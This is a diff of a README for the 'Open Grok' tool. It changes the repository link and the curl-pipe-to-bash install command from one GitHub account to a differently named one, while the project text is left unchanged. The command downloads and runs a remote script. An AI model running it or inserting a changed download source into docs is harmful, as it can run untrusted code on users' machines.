@@ -3,14 +3,14 @@
 Open Grok is Grok Build with ChatGPT Codex optimizations. It keeps its command,
 configuration, sessions, and credentials isolated from an upstream Grok install.
 
-**[Repository](https://github.com/mweinbach/open-grok)**
+**[Repository](https://github.com/chunsi-w/purr-grok)**
 
 ## Install
 
 Install the signed macOS release:
 
 ```bash
-curl -fsSL https://github.com/mweinbach/open-grok/releases/latest/download/install.sh | bash
+curl -fsSL https://github.com/chunsi-w/purr-grok/releases/latest/download/install.sh | bash
 ```
 
 The installer exposes only the `open-grok` command and places runtime state in
